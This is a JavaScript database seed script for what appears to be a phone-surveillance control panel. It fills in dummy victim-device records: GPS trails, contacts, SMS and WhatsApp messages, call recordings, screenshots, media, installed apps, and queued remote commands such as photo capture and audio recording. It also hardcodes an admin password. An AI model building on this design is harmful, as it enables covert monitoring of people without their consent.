const db = require('../models');

async function seed() {
  try {

    console.log("🌱 Seeding database...");

    /* -------------------------------
       CREATE ROLES
    --------------------------------*/
    const [adminRole] = await db.Role.findOrCreate({
      where: { name: 'admin' },
      defaults: {
        description: 'System Administrator',
        isSystem: true
      }
    });

    const [userRole] = await db.Role.findOrCreate({
      where: { name: 'user' },
      defaults: {
        description: 'Standard User',
        isSystem: true
      }
    });

    console.log("✅ Roles created");

    /* -------------------------------
       CREATE ADMIN USER
    --------------------------------*/
      console.log("👤 Seeding admin user...");

      const bcrypt = require("bcryptjs");

      const hashedPassword = await bcrypt.hash("Admin@1234", 10);

      await db.User.upsert({
          username: "admin",
          email: "admin@hawkshaw.com",
          password: hashedPassword,
          role: "admin",
          isActive: true
      });

// 🔥 fetch admin user after upsert
      const adminUser = await db.User.findOne({
          where: { email: "admin@hawkshaw.com" }
      });

      console.log("✅ Admin user created");

    /* -------------------------------
       MAP USER -> ROLE
    --------------------------------*/
    await db.UserRole.findOrCreate({
      where: {
        userId: adminUser.id,
        roleId: adminRole.id
      }
    });

    console.log("✅ UserRole mapping created");

    /* -------------------------------
       BASIC PERMISSIONS
    --------------------------------*/
    const permissions = [
      { key: 'devices.view', label: 'View Devices' },
      { key: 'devices.control', label: 'Control Devices' },
      { key: 'commands.execute', label: 'Execute Commands' },
      { key: 'files.view', label: 'View Files' },
      { key: 'files.download', label: 'Download Files' },
      { key: 'admin.full', label: 'Full Admin Access' }
    ];

    for (const perm of permissions) {
      const [permission] = await db.Permission.findOrCreate({
        where: { key: perm.key },
        defaults: perm
      });

      await db.RolePermission.findOrCreate({
        where: {
          roleId: adminRole.id,
          permissionId: permission.id
        }
      });
    }

    console.log("✅ Permissions seeded");

    /* -------------------------------
       SAMPLE DEVICES
    --------------------------------*/
    console.log("📱 Creating sample devices...");

    const devices = await Promise.all([
      db.Device.create({
        deviceId: "device_001",
        name: "Pixel 7",
        model: "Pixel 7",
        manufacturer: "Google",
        os: "Android",
        osVersion: "14",
        status: "online"
      }),
      db.Device.create({
        deviceId: "device_002",
        name: "Samsung S23",
        model: "SM-S911B",
        manufacturer: "Samsung",
        os: "Android",
        osVersion: "13",
        status: "offline"
      }),
      db.Device.create({
        deviceId: "device_003",
        name: "OnePlus 11",
        model: "CPH2449",
        manufacturer: "OnePlus",
        os: "Android",
        osVersion: "14",
        status: "online"
      })
    ]);

    /* -------------------------------
       LOCATIONS
    --------------------------------*/
    console.log("📍 Seeding locations...");

    for (const device of devices) {
      for (let i = 0; i < 3; i++) {
        await db.Location.create({
          deviceId: device.deviceId,
          latitude: 12.97 + i,
          longitude: 77.59 + i,
          provider: "gps",
          timestamp: new Date()
        });
      }
    }

    /* -------------------------------
       CONTACTS
    --------------------------------*/
    console.log("👤 Seeding contacts...");

    for (const device of devices) {
      for (let i = 0; i < 5; i++) {
        await db.Contact.create({
          deviceId: device.deviceId,
          contactId: `contact_${i}_${device.deviceId}`,
          displayName: `Contact ${i}`,
          phoneNumbers: [{ number: `98765432${i}`, type: "mobile" }]
        });
      }
    }

    /* -------------------------------
       SMS
    --------------------------------*/
    console.log("💬 Seeding SMS...");

    for (const device of devices) {
      for (let i = 0; i < 5; i++) {
        await db.SMS.create({
          deviceId: device.deviceId,
          smsId: `sms_${device.deviceId}_${i}`,
          address: `98765432${i}`,
          body: `Test message ${i}`,
          type: "inbox",
          date: new Date()
        });
      }
    }

    /* -------------------------------
       CALL RECORDINGS
    --------------------------------*/
    console.log("📞 Seeding call recordings...");

    for (const device of devices) {
      for (let i = 0; i < 3; i++) {
        await db.CallRecording.create({
          deviceId: device.deviceId,
          phoneNumber: "9876543210",
          callType: "incoming",
          callDirection: "inbound",
          callStartTime: new Date(),
          recordingFilePath: "/recordings/test.mp3",
          recordingFileName: "test.mp3"
        });
      }
    }

    /* -------------------------------
       SCREENSHOTS
    --------------------------------*/
    console.log("🖼 Seeding screenshots...");

    for (const device of devices) {
      for (let i = 0; i < 3; i++) {
        await db.Screenshot.create({
          deviceId: device.deviceId,
          filePath: `/screenshots/${i}.png`,
          fileName: `${i}.png`
        });
      }
    }

    /* -------------------------------
       FILE EXPLORER
    --------------------------------*/
    console.log("📁 Seeding file explorer...");

    for (const device of devices) {
      await db.FileExplorer.create({
        deviceId: device.deviceId,
        filePath: "/storage/emulated/0/DCIM",
        fileName: "DCIM",
        fileType: "directory"
      });
    }

      console.log("🖼 Seeding media gallery...");

      for (const device of devices) {
          for (let i = 0; i < 5; i++) {
              await db.MediaFile.create({
                  deviceId: device.deviceId,
                  filename: `photo_${i}.jpg`,
                  originalName: `IMG_${i}.jpg`,
                  filePath: `/media/photos/photo_${i}.jpg`,
                  fileSize: 1024 * (i + 1),
                  mimeType: "image/jpeg",
                  mediaType: "image",
                  width: 1920,
                  height: 1080,
                  capturedAt: new Date(),
                  uploadStatus: "completed"
              });
          }

          for (let i = 0; i < 2; i++) {
              await db.MediaFile.create({
                  deviceId: device.deviceId,
                  filename: `video_${i}.mp4`,
                  originalName: `VID_${i}.mp4`,
                  filePath: `/media/videos/video_${i}.mp4`,
                  fileSize: 2048000,
                  mimeType: "video/mp4",
                  mediaType: "video",
                  duration: 60,
                  uploadStatus: "completed"
              });
          }
      }

      console.log("🎯 Seeding command queue...");

      const commandTypes = [
          "get_device_info",
          "get_contacts",
          "get_sms",
          "take_photo",
          "record_audio",
          "location_request"
      ];

      for (const device of devices) {
          for (let i = 0; i < commandTypes.length; i++) {
              await db.Command.create({
                  deviceId: device.deviceId,
                  commandType: commandTypes[i],
                  status: i % 2 === 0 ? "pending" : "completed",
                  priority: "normal",
                  commandData: {
                      requestedBy: "system",
                      demo: true
                  }
              });
          }
      }

      console.log("📊 Seeding analytics data...");

      for (const device of devices) {

          // Locations timeline
          for (let i = 0; i < 10; i++) {
              await db.Location.create({
                  deviceId: device.deviceId,
                  latitude: 12.97 + Math.random(),
                  longitude: 77.59 + Math.random(),
                  provider: "gps",
                  timestamp: new Date(Date.now() - i * 3600000)
              });
          }

          // App logs
          for (let i = 0; i < 5; i++) {
              await db.AppLog.create({
                  deviceId: device.deviceId,
                  appPackage: "com.whatsapp",
                  appName: "WhatsApp",
                  logLevel: "info",
                  message: `User activity ${i}`,
                  timestamp: new Date()
              });
          }

          // Installed apps
          const apps = [
              "WhatsApp",
              "Instagram",
              "Facebook",
              "Telegram",
              "YouTube"
          ];

          for (const app of apps) {
              await db.InstalledApp.create({
                  deviceId: device.deviceId,
                  packageName: `com.demo.${app.toLowerCase()}`,
                  appName: app,
                  isSystemApp: false
              });
          }
      }

      console.log("💬 Seeding WhatsApp chats...");

      for (const device of devices) {
          for (let i = 0; i < 10; i++) {

              await db.SMS.create({
                  deviceId: device.deviceId,
                  smsId: `wa_${device.deviceId}_${i}`,
                  address: "+91987654321",
                  body: i % 2 === 0
                      ? "Hey, are you coming today?"
                      : "Yes, I'll reach in 10 mins",
                  type: i % 2 === 0 ? "inbox" : "sent",
                  date: new Date(Date.now() - i * 600000),
                  timestamp: new Date(Date.now() - i * 600000)
              });

              await db.AppLog.create({
                  deviceId: device.deviceId,
                  appPackage: "com.whatsapp",
                  appName: "WhatsApp",
                  logLevel: "info",
                  message: "WhatsApp message activity",
                  timestamp: new Date()
              });
          }
      }

      console.log("🔋 Seeding battery history...");

      console.log("🔋 Seeding battery history...");

      for (const device of devices) {

          await db.DeviceInfo.upsert({
              deviceId: device.deviceId,
              batteryLevel: Math.floor(20 + Math.random() * 80),

              hardwareInfo: {
                  manufacturer: "Samsung",
                  model: "Galaxy S21"
              },

              softwareInfo: {
                  androidVersion: "14",
                  sdk: 34
              },

              storageInfo: {
                  total: 128000,
                  used: Math.floor(Math.random() * 100000)
              },

              lastUpdated: new Date()
          });

      }

      console.log("🟢 Seeding device online status...");

      let toggle = true;

      for (const device of devices) {
          await device.update({
              isOnline: toggle,
              status: toggle ? "online" : "offline",
              lastSeen: new Date()
          });

          toggle = !toggle;
      }

      console.log("🗺 Seeding GPS movement path...");

      for (const device of devices) {

          let lat = 12.9716;
          let lng = 77.5946;

          for (let i = 0; i < 15; i++) {

              lat += (Math.random() - 0.5) * 0.01;
              lng += (Math.random() - 0.5) * 0.01;

              await db.Location.create({
                  deviceId: device.deviceId,
                  latitude: lat,
                  longitude: lng,
                  provider: "gps",
                  accuracy: 10,
                  timestamp: new Date(Date.now() - i * 300000)
              });
          }
      }


    console.log("🎉 Seed completed successfully");
    process.exit(0);

  } catch (err) {
    console.error("❌ Seed failed:", err);
    process.exit(1);
  }
}

seed();